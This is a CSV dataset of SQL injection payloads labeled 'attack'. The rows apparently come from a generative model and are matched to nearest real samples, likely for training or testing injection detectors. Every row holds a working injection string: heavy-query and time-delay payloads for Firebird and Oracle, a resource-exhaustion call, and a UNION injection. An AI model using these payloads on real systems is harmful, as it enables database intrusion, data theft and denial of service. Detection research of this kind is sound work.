id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance
GAN_000001,attack,boolean,"1'   )    )     )   and 9254  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",nearest_attack_euclidean,R002704,4.598995510117779
GAN_000002,attack,boolean,"select dbms_pipe.receive_message  (  chr  (  66  )  ||chr  (  67  )  ||chr  (  79  )  ||chr  (  101  )  ,5  )   from dual and   (  1491  =  1491",nearest_attack_euclidean,R008147,5.135438558907259
GAN_000003,attack,boolean,"select dbms_pipe.receive_message  (  chr  (  66  )  ||chr  (  67  )  ||chr  (  79  )  ||chr  (  101  )  ,5  )   from dual and   (  1491  =  1491",nearest_attack_euclidean,R008147,4.24170452085095
GAN_000004,attack,boolean,"1   )    )    and 9254  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",nearest_attack_euclidean,R003133,5.903758899348678
GAN_000005,attack,boolean,"select dbms_pipe.receive_message  (  chr  (  66  )  ||chr  (  67  )  ||chr  (  79  )  ||chr  (  101  )  ,5  )   from dual and   (  1491  =  1491",nearest_attack_euclidean,R008147,3.941230349779446
GAN_000006,attack,boolean,"1""   )    )     )   and 9660  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",nearest_attack_euclidean,R003486,4.566625219003931
GAN_000007,attack,boolean,"select dbms_pipe.receive_message  (  chr  (  66  )  ||chr  (  67  )  ||chr  (  79  )  ||chr  (  101  )  ,5  )   from dual and   (  1491  =  1491",nearest_attack_euclidean,R008147,4.3411928392239405
GAN_000008,attack,boolean,"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and   (  9646  =  9646",nearest_attack_euclidean,R003961,4.749033423508802
GAN_000009,attack,boolean,"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and   (  9646  =  9646",nearest_attack_euclidean,R003961,4.089258058332755
GAN_000010,attack,boolean,"1   )    )    or 1022  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",nearest_attack_euclidean,R007298,5.44688610411973
GAN_000011,attack,boolean,"1   )    )    and 9254  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",nearest_attack_euclidean,R003133,7.233667395446496
GAN_000012,attack,boolean,"select dbms_pipe.receive_message  (  chr  (  66  )  ||chr  (  67  )  ||chr  (  79  )  ||chr  (  101  )  ,5  )   from dual and   (  1491  =  1491",nearest_attack_euclidean,R008147,4.538214157557254
GAN_000013,attack,union,"-2896'   )    )    as wisk where 1030  =  1030 union all select 1030,1030,1030,1030#",nearest_attack_euclidean,R002117,4.804825358683228
